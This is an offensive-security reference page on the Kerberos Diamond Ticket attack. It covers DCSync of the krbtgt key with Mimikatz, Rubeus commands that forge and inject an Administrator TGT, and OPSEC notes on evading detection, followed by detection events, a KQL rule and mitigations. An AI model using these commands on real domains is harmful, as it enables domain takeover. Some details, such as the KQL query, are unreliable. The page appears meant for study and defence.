# Diamond Ticket Attack

## Overview

A Diamond Ticket is a forged TGT created by **decrypting a legitimate TGT**, modifying its PAC (Privilege Attribute Certificate), and re-encrypting it with the krbtgt AES key. Unlike a Golden Ticket which forges a TGT from scratch, a Diamond ticket starts with a real TGT issued by the KDC, making it inherently stealthier.

First publicly detailed by Charlie Clark (@_EthicalChaos_) at The Diana Initiative 2022 and implemented in Rubeus.

## Diamond Ticket vs Golden Ticket

| Aspect | Golden Ticket | Diamond Ticket |
|--------|--------------|----------------|
| **Creation** | Forged entirely offline | Decrypt legitimate TGT, modify PAC, re-encrypt |
| **TGT Source** | None (created from scratch) | Real TGT from KDC (AS-REQ required) |
| **KTGT Key** | Forged with any key type | Must use same key type as original TGT |
| **PAC** | Built from scratch, may have anomalies | Modified real PAC (more realistic) |
| **Detection** | PAC anomalies, lifetime, encryption mismatch | Harder to detect (based on real ticket) |
| **KVNO (Key Version Number)** | Usually wrong | Correct (from real ticket) |
| **Flags** | May have wrong flag combinations | Copied from real ticket |

### Why Diamond Tickets Are Better

1. **KVNO matches** - The key version number in the forged ticket matches what the KDC expects
2. **Real ticket flags** - Forwardable, renewable, proxiable flags are correct for the domain
3. **Real lifetime** - The start and end times are realistic
4. **No brute force needed** - No need to crack anything; only requires krbtgt AES key to decrypt/re-encrypt
5. **Stealthier than Golden** - Bypasses some Golden Ticket detections (KVNO checks, lifetime checks)

## Attack Flow

```
1. AS-REQ → KDC (with real pre-authentication)
2. AS-REP ← KDC (real TGT encrypted with krbtgt)
3. Extract TGT from AS-REP
4. Decrypt TGT using krbtgt AES key
5. Modify PAC (change user, add group memberships)
6. Re-encrypt TGT with krbtgt AES key
7. Inject Diamond TGT into current session
8. Use TGT to request TGS tickets for any service → Full domain access
```

### Information Required

| Data | Description | How to Obtain |
|------|-------------|---------------|
| krbtgt AES256 key | Needed to decrypt/re-encrypt TGT | DCSync (`lsadump::dcsync /user:krbtgt`) |
| Domain credentials | To request initial TGT | Standard domain user |
| Target user | User to impersonate | Usually `Administrator` or Domain Admin |

## Performing the Attack

### Rubeus (Windows)

```powershell
# Basic Diamond Ticket - uses TGT from /tgtdeleg
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /krbkey:KRBTGT_AES256_HASH /ptt

# Use explicit TGT from a .kirbi file
Rubeus.exe asktgt /user:john /rc4:USER_HASH /nowrap
# (copy the base64 TGT from output)
Rubeus.exe diamond /ticket:BASE64_TGT /ticketuser:Administrator /ticketuserid:500 /krbkey:KRBTGT_AES256_HASH /ptt

# Specify domain context
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /domain:domain.local /krbkey:KRBTGT_AES256_HASH /ptt

# Use specific encryption type
Rubeus.exe diamond /tgtdeleg /ticketuser:Admin /ticketuserid:500 /krbkey:KRBTGT_AES256_HASH /enctype:aes256 /ptt
```

**Parameters:**
- `/tgtdeleg` - Get a TGT using Kerberos delegation trick (no creds in memory)
- `/ticketuser` - User to impersonate
- `/ticketuserid` - RID of the target user (500 for Administrator, 519 for Enterprise Admins, etc.)
- `/krbkey` - krbtgt AES256 (or AES128) key
- `/ptt` - Pass-the-ticket (inject into current session)
- `/ticket` - Base64-encoded .kirbi TGT (instead of /tgtdeleg)
- `/enctype` - Force specific encryption type

### With Mimikatz + Rubeus (Manual)

```mimikatz# Step 1: Get krbtgt AES key
privilege::debug
lsadump::dcsync /domain:domain.local /user:krbtgt
# Copy the aes256_cts_hmac_sha1 value
```

```powershell
# Step 2: Use Rubeus diamond with the extracted key
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /krbkey:AES256_KEY /ptt

# Step 3: Verify access
klist
dir \\dc.domain.local\c$
```

## Technical Details

### How Decryption Works

The TGT is encrypted with krbtgt's key using a specific encryption type (RC4, AES128, or AES256). The krbtgt key used must match what the KDC used to encrypt the TGT:

- Modern Windows defaults to AES256 for new TGTs
- Older systems or certain configurations may use RC4
- Domain functional level influences default encryption

### PAC Structure

The PAC inside the TGT contains:
```
PAC_INFO_BUFFER:
  ├── KERB_VALIDATION_INFO (user SID, group SIDs, domain SID, etc.)
  ├── PAC_CLIENT_INFO (client name + time)
  ├── PAC_SERVER_CHECKSUM (signed by server key)
  └── PAC_PRIVSVR_CHECKSUM (signed by KDC key)
```

The Diamond attack modifies `KERB_VALIDATION_INFO` (user identity, groups) while keeping the PAC structure intact. The checksums are re-signed using the krbtgt key.

### Re-encryption

After modification, the TGT is re-encrypted with krbtgt's key. The KDC decrypts it with the same key, sees valid checksums (because we used the real krbtgt key), and treats it as legitimate.

## OPSEC Considerations

| Aspect | Consideration |
|--------|---------------|
| **Initial AS-REQ** | Must generate a real TGT first (event 4768 is logged) |
| **AS-REQ user** | The real user requesting the TGT is logged (not the impersonated user) |
| **krbtgt key** | Requires DCSync (DA privilege) which generates event 4662 |
| **Encryption matching** | The key used to re-encrypt must match the original encryption type |
| **KVNO** | Automatically correct (from real TGT) - no anomaly |
| **Lifetime** | Based on real TGT - no unrealistic lifetimes |
| **TGS usage** | After injection, TGS requests generate 4769 (as with any TGT) |
| **No PAC validation bypass** | Modern DCs may validate PAC server signature; Diamond re-signs it correctly |

### Stealth Advantages Over Golden

1. **KVNO is preserved** - Golden tickets often have wrong KVNO (0 or incorrect)
2. **Ticket flags are real** - Golden tickets may set flags incorrectly
3. **Authentication is logged correctly** - The initial AS-REQ/AS-REP is from a real user
4. **No brute-force** - No need to crack hashes
5. **Encryption type matches domain policy** - Uses whatever the DC chose

## Detection

### Event 4768 - TGT Requested

The initial legitimate TGT request generates a standard 4768 event. This looks normal and does not trigger alerts.

### Event 4769 - TGS Requests

After the Diamond TGT is injected, any TGS requests will generate 4769 events, just like normal Kerberos usage.

### Detection Challenges

- **Harder to detect than Golden** - Most Golden Ticket detections look for:
  - Unusual KVNO (Diamond has correct KVNO)
  - Unusual ticket lifetime (Diamond uses real lifetime)
  - Missing pre-authentication (Diamond uses real pre-auth)
- Diamond tickets look nearly identical to legitimate TGTs

### Potential Detection Points

1. **Time anomaly** - If TGT is modified after issuance but before usual expiration
2. **User mismatch** - The AS-REQ user differs from the PAC user (but this is normal for S4U/delegation)
3. **krbtgt key access** - Event 4662 (DCSync) prior to Diamond usage
4. **Behavioral** - Sudden administrative actions by a normally non-privileged user

### Detection Rules

```kusto
// KQL - Detect potential Diamond via krbtgt DCSync + anomalous admin activity
let KrbtgtAccess = 
    SecurityEvent
    | where EventID == 4662
    | where ObjectName contains "krbtgt";
let AdminActivity = 
    SecurityEvent
    | where EventID == 4672
    | where AccountName != "$*";
KrbtgtAccess
    | join kind=inner AdminActivity on AccountName
    | where TimeGenerated_diff < 1h
```

## Mitigations

1. **Protect krbtgt key** - Same mitigations as Golden Ticket:
   - Rotate krbtgt password regularly
   - Restrict DCSync rights
   - Monitor event 4662 for replication changes
2. **Enable KDC PAC Validation** - Validates PAC signatures
3. **Monitor for anomalous high-privilege usage**
4. **Use Protected Users group** - Prevents delegation and caching of credentials
5. **Use Windows Defender Credential Guard**
6. **Regular krbtgt rotation** (recommended every 6-12 months or after compromise):
   ```powershell
   # PowerShell - Rotate krbtgt password (requires DA)
   Reset-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString -AsPlainText "newpass" -Force)
   # Reset twice for full invalidation of old tickets
   Reset-ADAccountPassword -Identity krbtgt
   ```

## References

- Charlie Clark (@_EthicalChaos_) - The Diana Initiative 2022
- Rubeus implementation - Harmj0y (@tifkin_)
- MS-PAC: Privilege Attribute Certificate Structure
- MS-KILE: Kerberos Protocol Extensions
